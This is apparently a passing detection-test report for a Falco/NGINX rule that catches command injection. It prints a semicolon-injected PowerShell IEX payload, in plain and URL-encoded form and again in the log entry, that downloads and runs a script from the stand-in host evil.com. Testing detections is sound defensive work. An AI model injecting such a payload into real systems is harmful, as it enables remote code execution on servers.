name: test_e2e_with_logs[653_CMDI_PS_001]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMDI_PS_001` |
| **Name** | PowerShell IEX command injection |
| **Category** | CMDINJ |
| **Subcategory** | powershell |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `;powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/a')`
- **Encoded**: `%3Bpowershell%20-c%20IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A%2F%2Fevil.com%2Fa%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~33000ms
- **Timestamp**: 10:06:51.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMDI_PS_001-1772100411306-o0qo3 pattern_id=CMDI_PS_001 uri=/?q=%3Bpowershell%20-c%20IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A%2F%2Fevil.com%2Fa%27%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMDI_PS_001-1772100411306-o0qo3 pattern_id=CMDI_PS_001 uri=/?q=%3Bpowershell%20-c%20IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A%2F%2Fevil.com%2Fa%27%29 client=127.0.0.1

**Falco Log Entry**:
```
10:06:51.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMDI_PS_001-1772100411306-o0qo3 pattern_id=CMDI_PS_001 uri=/?q=%3Bpowershell%20-c%20IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A%2F%2Fevil.com%2Fa%27%29 client=127.0.0.1
```
